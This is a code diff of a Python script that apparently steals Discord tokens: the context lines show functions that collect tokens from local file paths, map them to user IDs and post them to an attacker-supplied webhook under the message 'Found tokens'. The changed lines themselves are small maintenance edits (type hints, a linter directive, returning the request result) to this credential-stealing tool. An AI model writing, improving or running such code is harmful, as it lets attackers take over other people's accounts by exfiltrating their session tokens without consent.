@@ -14,7 +14,7 @@ REQUEST_HEADERS = {
 WEBHOOK_URL = "YOUR WEBHOOK URL"
 
 
-def make_post_request(api_url: str, data: dict[str, str]) -> int:
+def make_post_request(api_url: str, data: dict) -> int:
     if not api_url.startswith(("http", "https")):
         raise ValueError
 
@@ -64,7 +64,7 @@ def get_user_id_from_token(token: str) -> str | None:
     return discord_user_id
 
 
-def get_tokens_from_path(base_path: Path) -> dict[str, set]:
+def get_tokens_from_path(base_path: Path) -> dict[str, set] | None:
     """Collect discord tokens for each user ID.
 
     to manage the occurrence of both valid and expired Discord tokens, which happens when a
@@ -113,7 +113,7 @@ def send_tokens_to_webhook(
     preventing it from being sent. There are no plans to introduce code
     modifications to segment the message for compliance with character
     constraints.
-    """  # noqa: D205
+    """  # noqa: D205, DOC201
     fields: list[dict] = []
 
     for user_id, tokens in user_id_to_token.items():
@@ -124,7 +124,7 @@ def send_tokens_to_webhook(
 
     data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
 
-    make_post_request(webhook_url, data)
+    return make_post_request(webhook_url, data)
 
 
 def main() -> None:
